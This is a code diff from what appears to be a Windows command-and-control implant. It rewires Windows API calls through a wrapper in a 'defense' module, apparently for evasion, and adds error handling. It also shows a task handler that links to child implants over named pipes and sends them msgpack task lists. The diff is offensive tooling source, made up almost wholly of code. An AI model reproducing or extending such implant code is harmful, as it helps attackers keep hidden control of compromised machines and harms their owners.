@@ -36,7 +36,7 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "core/c2.h"
 #include "comms/smb.h"
 #include "_debug/debug.h"
-
+#include "defense/winapi.h"
 //move to own file?
 std::string GetErrorMessage(DWORD dwErrorCode) {
     if (dwErrorCode == ERROR_SUCCESS) {
@@ -46,7 +46,7 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
     LPSTR messageBuffer = nullptr;
 
     // Ask Windows to find the message and allocate the required memory
-    size_t size = FormatMessageA(
+    size_t size = WinApi::FormatMessageA(
         FORMAT_MESSAGE_ALLOCATE_BUFFER |
         FORMAT_MESSAGE_FROM_SYSTEM |
         FORMAT_MESSAGE_IGNORE_INSERTS,
@@ -58,11 +58,16 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
         NULL
     );
 
+
+    if (size == 0 || messageBuffer == nullptr) {
+        return "Unknown error code: " + std::to_string(dwErrorCode);
+    }
+
     // Copy the message into a std::string
     std::string message(messageBuffer, size);
 
     // Free the buffer allocated by the system
-    LocalFree(messageBuffer);
+    WinApi::LocalFree(messageBuffer);
 
     //clean up windows stuff
     //if (!message.empty() && message.back() == '\n') message.pop_back();
@@ -328,8 +333,8 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             DEBUG_LOG("Waiting for connection from child");
 
             // quickly connect to pipes
-            HANDLE h_parent_write = CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-            HANDLE h_parent_read = CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+            HANDLE h_parent_write = WinApi::CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            HANDLE h_parent_read = WinApi::CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 
             if (h_parent_write != INVALID_HANDLE_VALUE && h_parent_read != INVALID_HANDLE_VALUE) {
                 DEBUG_LOG("Pipes connected. Waiting for child to check in...");
@@ -338,7 +343,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
                 // CRITICAL: Force the read handle into Message Mode so MsgPack doesn't fragment
                 DWORD mode = PIPE_READMODE_MESSAGE;
-                if (!SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
+                if (!WinApi::SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
                     std::cerr << "Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
                 }
 
@@ -380,7 +385,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
                     std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);
 
                     DWORD bytes_written = 0;
-                    WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
+                    WinApi::WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
 
                 }
                 catch (const std::exception& e) {
@@ -391,7 +396,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             }
             else {
                 //for invliad handels, i.e. bad perms, etc.
-                int windows_error_code = GetLastError();
+                int windows_error_code = WinApi::GetLastError();
                 result["message"] = GetErrorMessage(windows_error_code);
                 result["windows_error_code"] = windows_error_code;
                 return result;
